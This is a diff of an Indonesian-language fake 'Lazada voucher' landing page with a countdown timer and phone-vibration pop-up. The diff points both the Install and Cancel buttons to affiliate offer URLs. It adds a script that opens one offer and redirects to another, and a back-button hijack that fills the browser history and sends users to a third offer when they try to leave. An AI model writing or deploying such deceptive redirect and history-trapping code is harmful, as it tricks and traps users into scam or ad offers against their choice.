@@ -26,11 +26,35 @@
 <p style="text-align:center;margin-top:10px;font-size:15px;color:red;font-family:sans-serif"><span id="mins">2</span> menit dan <span id="hsecs">09</span> detik</p>
 </div>
 <div class="buttons">
-<a class="button exitpoint" href="javascript:void(0)" style="cursor:pointer!important" onclick="exit_a1();PreventExitPop=false" rel="noreferrer"><span id="install">Instal</span></a>
-<a class="button cancel" href="javascript:void(0)" style="cursor:pointer!important" onclick="exit_a1();PreventExitPop=false" rel="noreferrer"><span id="channel">Batal</span></a>
+<a class="button exitpoint" href="https://in.oceseller.com/click.php?lp=1&to_offer=2" style="cursor:pointer!important" onclick="ctaclick()" rel="noreferrer"><span id="install">Instal</span></a>
+<a class="button cancel" href="https://in.oceseller.com/click.php?lp=1&to_offer=2" style="cursor:pointer!important" onclick="ctaclick()" rel="noreferrer"><span id="channel">Batal</span></a>
 </div>
 </div>
 </div>
 <script type="text/javascript">function getRandomInt(b,a){return Math.floor(Math.random()*(a-b+1))+b}function shake(){var a=navigator;a.vibrate=a.vibrate||a.webkitVibrate||a.mozVibrate||a.msVibrate;a.vibrate([1000,500,1000,500,1000,500,1000,500,1000,500]);var b=confirm("Apakah Anda yakin ingin melepaskan kesempatan Anda untuk mendapatkan voucher Lazada?\n\nKesempatan Anda akan diberikan kepada pengguna berikutnya!")}setTimeout(shake,getRandomInt(120,220)*1000);function countdown(){var b=parseInt(document.getElementById("mins").innerHTML),a=parseInt(document.getElementById("hsecs").innerHTML),d=0,c=0;0!==b&&0===a?(d=b-1,c=59):0!==b||0!==a?(d=b,c=a-1):0===b&&0===a&&(d=b,c=a),c<10&&(c="0"+c),document.getElementById("mins").textContent=d,document.getElementById("hsecs").textContent=c}setInterval("countdown()",1000);function exit_a1(){window.onbeforeunload=null,window.location="http://"+getURLParameter("td")+"/click"};</script>
+
+<script>
+
+  function ctaclick(){
+      window.onbeforeunload = null;
+      window.open("https://in.oceseller.com/click.php?lp=1&to_offer=1", "_blank");
+      location.replace("https://in.oceseller.com/click.php?lp=1&to_offer=2");
+  }
+  
+  </script>
+  
+  <script type="text/javascript">
+      //Historyback
+      ! function() {
+          var t;
+          try {
+              for (t = 0; 10 > t; ++t) history.pushState({}, "", "");
+              onpopstate = function(t) {
+                  window.onbeforeunload = null;
+                  t.state && location.replace('https://in.oceseller.com/click.php?lp=1&to_offer=3');
+              };
+          } catch (o) {}
+      }();
+  </script>
 
 </body></html>
